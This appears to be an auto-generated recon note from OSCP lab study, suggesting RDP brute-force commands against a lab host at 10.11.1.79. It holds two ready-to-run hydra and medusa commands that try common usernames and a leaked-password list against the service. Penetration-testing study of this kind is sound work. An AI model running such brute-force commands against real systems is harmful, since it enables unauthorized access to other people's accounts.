```bash
[*] ms-wbt-server on tcp/3389

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 3389 -o "/home/kali/study/OSCP/Labs/10.11.1.79/results/10.11.1.79/scans/tcp3389/tcp_3389_rdp_hydra.txt" rdp://10.11.1.79

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 3389 -O "/home/kali/study/OSCP/Labs/10.11.1.79/results/10.11.1.79/scans/tcp3389/tcp_3389_rdp_medusa.txt" -M rdp -h 10.11.1.79


```